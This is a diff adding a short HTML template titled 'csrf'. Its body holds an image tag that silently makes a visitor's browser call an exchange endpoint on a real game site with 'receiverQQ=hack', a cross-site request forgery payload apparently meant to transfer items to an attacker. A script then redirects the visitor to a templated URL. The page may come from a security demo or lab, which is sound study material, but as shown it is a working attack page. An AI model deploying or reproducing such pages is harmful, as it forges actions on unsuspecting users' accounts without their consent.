@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+    <meta charset="UTF-8">
+    <title>csrf</title>
+    <script type="text/javascript"></script>
+    <script type="text/javascript" src="/js/jquery-3.1.1.min.js"></script>
+</head>
+<body>
+
+<img src="http://speed.qqspeed.com/exchange?receiverQQ=hack">
+
+
+</body>
+<script type="text/javascript">
+    $(function () {
+        var url='[[${redirectUrl}]]';
+        window.location=url;
+    })
+</script>
+</html>
